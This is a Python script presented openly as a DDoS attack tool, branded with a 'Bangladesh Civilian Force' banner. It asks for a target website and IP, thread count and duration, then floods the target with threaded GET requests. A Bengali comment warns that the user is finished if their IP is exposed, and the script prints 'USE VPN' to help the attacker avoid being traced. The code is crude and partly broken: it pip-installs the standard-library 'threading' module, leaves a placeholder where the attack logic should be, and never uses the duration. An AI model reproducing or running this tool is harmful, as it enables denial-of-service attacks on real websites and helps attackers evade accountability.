import requests
import threading
import time
from colorama import init, Fore, Style
import subprocess


# ভালো কাজে ব্যাবহার কইরেন!!! আইপি এক্সপস হইলে আম্নে শেষ⚠
# Define the list of packages to install
packages = ["requests", "threading", "colorama"]

# Install the packages using pip
for pkg in packages:
    subprocess.run(["pip", "install", pkg])

# Initialize colorama to support ANSI escape sequences on Windows
init()

def establish_connection(url):
    try:
        response = requests.get(url)
        print("Connection established with", url)
        return True
    except Exception as e:
        print("Error establishing connection:", e)
        return False

def send_request(session, url):
    try:
        response = session.get(url)
        # Add your DDoS attack logic here
        print("DDoS attack request sent")
    except requests.exceptions.RequestException as e:
        print("Error occurred during DDoS attack:", e)

def start_ddos(url, num_threads=9999, duration=60):
    try:
        if not establish_connection(url):
            print("Exiting program.")
            return

        print("Setting up threads...")
        time.sleep(5)  # Wait for 5 seconds before setting up threads

        with requests.Session() as session:
            threads = []
            for _ in range(num_threads):
                thread = threading.Thread(target=send_request, args=(session, url))
                threads.append(thread)
                
                # Start 5 threads at once
                if len(threads) == 5:
                    for thread in threads:
                        thread.start()
                    for thread in threads:
                        thread.join()
                    threads = []
                    time.sleep(1)  # Wait for 1 second before starting the next batch

            print("DDoS attack completed.")
    except KeyboardInterrupt:
        print("\nDDoS attack interrupted.")
    except Exception as e:
        print("Error occurred:", e)

def main():
    # Display ASCII art
    ascii_art = """
   
    ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░       ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░        ░▒▓██████▓▒░   ░▒▓█▓▒░  ░▒▓████████▓▒░▒▓███████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    
                                                    𝔅𝔞𝔫𝔤𝔩𝔞𝔡𝔢𝔰𝔥 ℭ𝔦𝔳𝔦𝔩𝔦𝔞𝔫 𝔉𝔬𝔯𝔠𝔢                                                         
   
   
   
    """
    print(Fore.WHITE + ascii_art)

    # User input section
    target_website = input("Enter the target website link: ")
    target_ip = input("Enter the target IP address: ")
    total_threads = int(input("Enter the total threads (default is 9999): ") or "9999")
    attack_time = int(input("Enter the attack time in seconds (default is 60): ") or "60")

    print("\033[1;91m\033[5mUSE VPN - USE VPN - USE VPN\033[0m")

    # Start DDoS attack
    start_ddos(target_website, total_threads, attack_time)

if __name__ == "__main__":
    main()
